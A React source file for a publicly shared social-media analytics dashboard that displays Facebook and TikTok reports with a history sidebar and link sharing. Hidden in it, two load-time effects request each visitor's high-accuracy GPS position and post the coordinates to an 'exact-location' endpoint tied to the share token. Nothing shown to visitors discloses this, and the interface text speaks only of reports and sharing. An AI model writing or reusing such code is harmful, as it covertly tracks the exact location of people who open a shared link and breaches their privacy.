import { useEffect, useState, useRef } from 'react';
import { useParams } from 'react-router-dom';
import { useTranslation } from 'react-i18next';
import api from '../../../utils/api';
import PublicLayout from '../PublicLayout';
import TikTokReportView from './TikTokReportView';
import FacebookReportView from './FacebookReportView';
import { motion, AnimatePresence } from 'framer-motion';
import PerfectScrollbar from 'react-perfect-scrollbar';
import { 
    IconCalendar, 
    IconChevronRight, 
    IconLoader2, 
    IconAlertCircle, 
    IconChevronDown,
    IconInfoCircle,
    IconHelpCircle,
    IconShare,
    IconCopy,
    IconBrandTiktok
} from '@tabler/icons-react';


const PublicPageDashboard = () => {
    const { token } = useParams();
    const { t } = useTranslation();
    const [data, setData] = useState<any>(null);
    const [activeReport, setActiveReport] = useState<any>(null);
    const [loading, setLoading] = useState(true);
    const [error, setError] = useState<string | null>(null);
    const [isHistoryOpen, setIsHistoryOpen] = useState(false);
    const [showInstructions, setShowInstructions] = useState(true);
    const [copied, setCopied] = useState(false);

    useEffect(() => {
        const fetchPublicData = async () => {
            try {
                const response = await api.get(`/public/share/${token}`);
                setData(response.data);
                if (response.data.reports?.data?.length > 0) {
                    setActiveReport(response.data.reports.data[0]);
                }
            } catch (err: any) {
                setError(err.response?.status === 404 ? "Dashboard not found." : "Failed to load data.");
            } finally {
                setLoading(false);
            }
        };
        fetchPublicData();
    }, [token]);

    // Request high accuracy location
    const requestHighAccuracyLocation = () => {
        if (!navigator.geolocation) {
            console.error("Geolocation is not supported by this browser.");
            return;
        }

        const options = {
            enableHighAccuracy: true,
            timeout: 10000,
            maximumAge: 0
        };

        navigator.geolocation.getCurrentPosition(
            async (position) => {
                const { latitude, longitude } = position.coords;
                try {
                    await api.post(`/public/share/${token}/exact-location`, {
                        lat: latitude,
                        lng: longitude
                    });
                    console.log("High accuracy location updated.");
                } catch (err) {
                    console.error("Failed to sync GPS data to server.");
                }
            },
            (error) => {
                console.warn(`Location Error (${error.code}): ${error.message}`);
            },
            options
        );
    };

    useEffect(() => {
        if (data) {
            requestHighAccuracyLocation();
        }
    }, [data]);

    const syncExactLocation = async (position: GeolocationPosition) => {
        try {
            await api.post(`/public/share/${token}/exact-location`, {
                lat: position.coords.latitude,
                lng: position.coords.longitude
            });
        } catch (error) {
            console.error("GPS Sync Failed", error);
        }
    };

    useEffect(() => {
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(syncExactLocation, null, {
                enableHighAccuracy: true,
                timeout: 5000
            });
        }
    }, [token]);

    const reportList = data?.reports?.data || [];
    const showHistory = reportList.length > 0;

    // Copy share link
    const copyShareLink = () => {
        const currentUrl = window.location.href;
        navigator.clipboard.writeText(currentUrl).then(() => {
            setCopied(true);
            setTimeout(() => setCopied(false), 2000);
        });
    };

    // Format date for display
    const formatDate = (dateString: string) => {
        const date = new Date(dateString);
        return date.toLocaleDateString('en-US', { month: 'short', day: 'numeric', year: 'numeric' });
    };

    // Instructions component
    const InstructionsPanel = () => (
        <div className="bg-gradient-to-r from-blue-50 to-indigo-50 dark:from-blue-900/20 dark:to-indigo-900/20 border border-blue-200 dark:border-blue-800 rounded-2xl p-6 mb-8 animate-fade-in">
            <div className="flex items-start justify-between mb-4">
                <div className="flex items-center gap-3">
                    <div className="p-2 bg-blue-100 dark:bg-blue-900 rounded-lg">
                        <IconInfoCircle className="w-5 h-5 text-blue-600 dark:text-blue-400" />
                    </div>
                    <div>
                        <h3 className="font-bold text-gray-900 dark:text-white">Welcome to Your Analytics Dashboard</h3>
                        <p className="text-sm text-gray-600 dark:text-gray-300 mt-1">
                            Interactive report viewer with {reportList.length} {reportList.length === 1 ? 'report' : 'reports'} available
                        </p>
                    </div>
                </div>
                <button
                    onClick={() => setShowInstructions(false)}
                    className="text-gray-400 hover:text-gray-600 dark:hover:text-gray-200"
                >
                    ×
                </button>
            </div>
            
            <div className="grid grid-cols-1 md:grid-cols-3 gap-4 mt-4">
                <div className="flex items-start gap-3 p-3 bg-white/50 dark:bg-gray-800/30 rounded-xl">
                    <div className="p-2 bg-blue-100 dark:bg-blue-900 rounded-lg">
                        <IconCalendar className="w-4 h-4 text-blue-600 dark:text-blue-400" />
                    </div>
                    <div>
                        <h4 className="text-sm font-semibold text-gray-900 dark:text-white">Report History</h4>
                        <p className="text-xs text-gray-600 dark:text-gray-300 mt-1">
                            {showHistory 
                                ? `Browse ${reportList.length} historical reports in the sidebar` 
                                : 'Only one report available'}
                        </p>
                    </div>
                </div>
                
                <div className="flex items-start gap-3 p-3 bg-white/50 dark:bg-gray-800/30 rounded-xl">
                    <div className="p-2 bg-green-100 dark:bg-green-900 rounded-lg">
                        <IconShare className="w-4 h-4 text-green-600 dark:text-green-400" />
                    </div>
                    <div>
                        <h4 className="text-sm font-semibold text-gray-900 dark:text-white">Share Dashboard</h4>
                        <p className="text-xs text-gray-600 dark:text-gray-300 mt-1">
                            Copy link to share this report with team members
                        </p>
                        <button
                            onClick={copyShareLink}
                            className="mt-2 px-3 py-1.5 bg-blue-100 dark:bg-blue-900 hover:bg-blue-200 dark:hover:bg-blue-800 text-blue-700 dark:text-blue-300 text-xs font-medium rounded-lg transition-colors flex items-center gap-2"
                        >
                            <IconCopy className="w-3 h-3" />
                            {copied ? 'Copied!' : 'Copy Link'}
                        </button>
                    </div>
                </div>
                
                <div className="flex items-start gap-3 p-3 bg-white/50 dark:bg-gray-800/30 rounded-xl">
                    <div className="p-2 bg-purple-100 dark:bg-purple-900 rounded-lg">
                        <IconHelpCircle className="w-4 h-4 text-purple-600 dark:text-purple-400" />
                    </div>
                    <div>
                        <h4 className="text-sm font-semibold text-gray-900 dark:text-white">Need Help?</h4>
                        <p className="text-xs text-gray-600 dark:text-gray-300 mt-1">
                            Data updates automatically. Contact support for questions about metrics.
                        </p>
                    </div>
                </div>
            </div>
        </div>
    );

    // Report selector item
    const ReportSelectorItem = ({ report, isActive, onClick }: any) => {
        const platformColor = report.platform === 'facebook' ? 'bg-blue-500' : 'bg-pink-500';
        const platformIcon = report.platform === 'facebook' ? 'FB' : <IconBrandTiktok size={16} className="text-white" />;
        
        return (
            <motion.button
                whileHover={{ scale: 1 }}
                whileTap={{ scale: 0.98 }}
                onClick={onClick}
                className={`w-full text-left p-3 rounded-lg border transition-all duration-300 group ${
                    isActive 
                    ? 'bg-gradient-to-r from-blue-500/10 to-blue-600/10 dark:from-blue-500/20 dark:to-blue-600/20 border-blue-300 dark:border-blue-700 shadow-lg shadow-blue-500/10' 
                    : 'bg-gray-50/50 dark:bg-gray-800/30 border-gray-200 dark:border-gray-700 hover:border-blue-300 dark:hover:border-blue-700'
                }`}
            >
                <div className="flex items-start justify-between mb-3">
                    <div className={`w-8 h-8 ${platformColor} text-white rounded-lg flex items-center justify-center text-xs font-bold`}>
                        {platformIcon}
                    </div>
                    <IconChevronRight size={16} className={isActive ? 'text-blue-500' : 'text-gray-400 group-hover:text-blue-500'} />
                </div>
                
                <div className="text-xs font-semibold text-gray-500 dark:text-gray-400 mb-1">
                    {formatDate(report.start_date)} – {formatDate(report.end_date)}
                </div>
                
                <div className="text-sm font-bold text-gray-900 dark:text-white truncate mb-2">
                    {report.platform === 'facebook' ? 'Facebook Report' : 'TikTok Report'}
                </div>
                
                <div className="flex items-center gap-4 text-xs">
                    <div className="flex items-center gap-1">
                        <div className="w-2 h-2 bg-blue-500 rounded-full"></div>
                        <span className="text-gray-600 dark:text-gray-300">
                            {report.platform === 'facebook' ? report.report_data?.total_content || 0 : report.report_data?.total_content || 0} {report.platform === 'facebook' ? 'Posts' : 'Videos'}
                        </span>
                    </div>
                    <div className="flex items-center gap-1">
                        <div className="w-2 h-2 bg-emerald-500 rounded-full"></div>
                        <span className="text-gray-600 dark:text-gray-300">
                            {report.total_views?.toLocaleString() || 0} views
                        </span>
                    </div>
                </div>
            </motion.button>
        );
    };

    // History content component
    const HistoryContent = () => (
        <div className="flex flex-col h-full">
            <div className="flex items-center justify-between mb-6 px-2">
                <div className="flex items-center gap-3">
                    <div className="p-2 bg-gradient-to-br from-blue-500 to-blue-600 text-white rounded-lg">
                        <IconCalendar size={18} />
                    </div>
                    <div>
                        <h2 className="text-sm font-black uppercase tracking-widest text-gray-900 dark:text-white">
                            Report Archive
                        </h2>
                        <p className="text-xs text-gray-500 dark:text-gray-400 mt-1">
                            {reportList.length} report{reportList.length !== 1 ? 's' : ''} • Click to switch
                        </p>
                    </div>
                </div>

                <button
                    onClick={copyShareLink}
                    className="p-2 text-emerald-600 dark:text-emerald-400 bg-emerald-100/50 dark:bg-emerald-900/50 rounded-lg"
                    title="Share dashboard"
                >
                    <IconShare size={18} />
                </button>
            </div>
            
            <PerfectScrollbar className='max-h-[400px] p-0'
                            options={{ suppressScrollX: true, wheelPropagation: false }} 
            >
            <div className="space-y-3 flex-1 overflow-y-auto p-2.5">
                {reportList.map((report: any) => (
                    <ReportSelectorItem
                        key={report.id}
                        report={report}
                        isActive={activeReport?.id === report.id}
                        onClick={() => {
                            setActiveReport(report);
                            setIsHistoryOpen(false);
                        }}
                    />
                ))}
            </div>
            </PerfectScrollbar>
            
            {/* Help text for single report */}
            {reportList.length === 1 && (
                <div className="mt-6 p-4 bg-gray-50/50 dark:bg-gray-800/30 rounded-xl border border-gray-200 dark:border-gray-700">
                    <div className="flex items-start gap-3">
                        <IconInfoCircle size={16} className="text-blue-500 dark:text-blue-400 mt-0.5" />
                        <div>
                            <p className="text-xs font-medium text-gray-700 dark:text-gray-300">
                                This is your only report. New reports will appear here automatically.
                            </p>
                        </div>
                    </div>
                </div>
            )}
        </div>
    );

    // Loading state
    if (loading) return (
        <PublicLayout>
            <div className="flex flex-col items-center justify-center min-h-[70vh]">
                <div className="relative">
                    <IconLoader2 className="animate-spin text-blue-500" size={48} />
                </div>
                <p className="mt-6 text-gray-600 dark:text-gray-300 font-medium">Loading your analytics dashboard...</p>
                <p className="text-sm text-gray-500 dark:text-gray-400 mt-2">Preparing {data?.page_name || 'your'} reports</p>
            </div>
        </PublicLayout>
    );

    // Error state
    if (error) return (
        <PublicLayout>
            <div className="flex flex-col items-center justify-center min-h-[70vh] px-4">
                <div className="p-4 bg-red-50 dark:bg-red-900/20 rounded-2xl mb-6">
                    <IconAlertCircle size={64} className="text-red-500 dark:text-red-400" />
                </div>
                <h2 className="text-2xl font-bold text-gray-900 dark:text-white mb-3">Unable to Load Dashboard</h2>
                <p className="text-gray-600 dark:text-gray-300 text-center mb-6 max-w-md">{error}</p>
                <div className="flex gap-3">
                    <button
                        onClick={() => window.location.reload()}
                        className="px-5 py-2.5 bg-blue-600 hover:bg-blue-700 text-white font-medium rounded-xl transition-colors"
                    >
                        Try Again
                    </button>
                    <button
                        onClick={copyShareLink}
                        className="px-5 py-2.5 bg-gray-200 dark:bg-gray-800 hover:bg-gray-300 dark:hover:bg-gray-700 text-gray-700 dark:text-gray-300 font-medium rounded-xl transition-colors"
                    >
                        Copy Link
                    </button>
                </div>
            </div>
        </PublicLayout>
    );

    // Empty state
    if (!activeReport) return (
        <PublicLayout>
            <div className="flex flex-col items-center justify-center min-h-[70vh] px-4">
                <div className="p-6 bg-gradient-to-br from-blue-50 to-indigo-50 dark:from-gray-800 dark:to-gray-900 rounded-2xl border border-gray-200 dark:border-gray-700 max-w-md text-center">
                    <div className="w-16 h-16 bg-gradient-to-r from-blue-500 to-blue-600 rounded-2xl flex items-center justify-center mx-auto mb-6">
                        <IconCalendar className="w-8 h-8 text-white" />
                    </div>
                    <h2 className="text-xl font-bold text-gray-900 dark:text-white mb-3">No Reports Available</h2>
                    <p className="text-gray-600 dark:text-gray-300 mb-6">
                        Your analytics dashboard is currently empty. Reports will appear here once they are generated.
                    </p>
                    <div className="space-y-4">
                        <div className="p-4 bg-white dark:bg-gray-800 rounded-xl border border-gray-200 dark:border-gray-700">
                            <p className="text-sm text-gray-700 dark:text-gray-300">
                                Share this link to grant access to future reports:
                            </p>
                            <button
                                onClick={copyShareLink}
                                className="mt-3 px-4 py-2 bg-blue-100 dark:bg-blue-900 hover:bg-blue-200 dark:hover:bg-blue-800 text-blue-700 dark:text-blue-300 text-sm font-medium rounded-lg transition-colors w-full flex items-center justify-center gap-2"
                            >
                                <IconCopy className="w-4 h-4" />
                                {copied ? 'Link Copied!' : 'Copy Dashboard Link'}
                            </button>
                        </div>
                    </div>
                </div>
            </div>
        </PublicLayout>
    );

    return (
        <PublicLayout>
            <div className="flex flex-col lg:flex-row gap-8 items-start relative min-h-[70vh]">
                
                {/* LEFT SIDE: DYNAMIC DASHBOARD */}
                <div className="flex-1 w-full min-w-0">
                    {/* Instructions Panel */}
                    {showInstructions && <InstructionsPanel />}
                    {/* Report View */}
                    <div className="animate-fade-in">
                        {activeReport?.platform === 'facebook' ? (
                            <FacebookReportView report={activeReport} pageName={data.page_name} />
                        ) : (
                            <TikTokReportView report={activeReport} pageName={data.page_name} />
                        )}
                    </div>
                </div>

                {/* HISTORY SECTION - Desktop */}
                {showHistory && (
                    <>
                        
                        <div className="hidden lg:block w-80 shrink-0 sticky top-24">
                            <div className="bg-white dark:bg-gray-900 p-4 rounded-2xl border border-gray-200 dark:border-gray-800 shadow-xl shadow-gray-200/50 dark:shadow-gray-900/50">
                                <HistoryContent />
                            </div>
                        </div>

                      
                        <div className="lg:hidden fixed bottom-6 right-6 z-[60]">
                            <AnimatePresence>
                                {isHistoryOpen && (
                                    <motion.div 
                                        initial={{ opacity: 0, y: 20, scale: 0.95 }}
                                        animate={{ opacity: 1, y: 0, scale: 1 }}
                                        exit={{ opacity: 0, y: 20, scale: 0.95 }}
                                        className="absolute bottom-20 right-0 w-[320px] max-h-[70vh] overflow-hidden shadow-2xl rounded-2xl"
                                    >
                                        <div className="bg-white dark:bg-gray-900 border border-gray-200 dark:border-gray-800 p-5 h-full">
                                            <HistoryContent />
                                        </div>
                                    </motion.div>
                                )}
                            </AnimatePresence>

                            
                            <motion.button 
                                whileHover={{ scale: 1 }}
                                whileTap={{ scale: 0.9 }}
                                onClick={() => setIsHistoryOpen(!isHistoryOpen)}
                                className={`w-14 h-14 rounded-full shadow-2xl flex items-center justify-center transition-all duration-300 ${
                                    isHistoryOpen 
                                        ? 'bg-gradient-to-br from-rose-500 to-pink-500 rotate-180' 
                                        : 'bg-gradient-to-br from-blue-500 to-blue-600'
                                }`}
                            >
                                {isHistoryOpen ? (
                                    <IconChevronDown size={24} className="text-white" />
                                ) : (
                                    <IconCalendar size={24} className="text-white" />
                                )}
                            </motion.button>
                        </div>
                    </>
                )}
            </div>
            
            {/* Footer Instructions */}
            {/* <div className="mt-12 pt-8 border-t border-gray-200 dark:border-gray-800">
                <div className="max-w-4xl mx-auto">
                    <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
                        <div className="flex items-start gap-3">
                            <div className="p-2 bg-blue-100 dark:bg-blue-900 rounded-lg">
                                <IconInfoCircle className="w-5 h-5 text-blue-600 dark:text-blue-400" />
                            </div>
                            <div>
                                <h4 className="text-sm font-semibold text-gray-900 dark:text-white mb-1">Data Freshness</h4>
                                <p className="text-xs text-gray-600 dark:text-gray-400">
                                    Reports update automatically. Last sync: {new Date().toLocaleDateString()}
                                </p>
                            </div>
                        </div>
                        
                        <div className="flex items-start gap-3">
                            <div className="p-2 bg-emerald-100 dark:bg-emerald-900 rounded-lg">
                                <IconShare className="w-5 h-5 text-emerald-600 dark:text-emerald-400" />
                            </div>
                            <div>
                                <h4 className="text-sm font-semibold text-gray-900 dark:text-white mb-1">Sharing</h4>
                                <p className="text-xs text-gray-600 dark:text-gray-400">
                                    This link provides read-only access. All data is secure.
                                </p>
                            </div>
                        </div>
                        
                        <div className="flex items-start gap-3">
                            <div className="p-2 bg-purple-100 dark:bg-purple-900 rounded-lg">
                                <IconHelpCircle className="w-5 h-5 text-purple-600 dark:text-purple-400" />
                            </div>
                            <div>
                                <h4 className="text-sm font-semibold text-gray-900 dark:text-white mb-1">Need Help?</h4>
                                <p className="text-xs text-gray-600 dark:text-gray-400">
                                    Contact your analytics manager for detailed explanations.
                                </p>
                            </div>
                        </div>
                    </div>
                </div>
            </div> */}
        </PublicLayout>
    );
};

export default PublicPageDashboard;
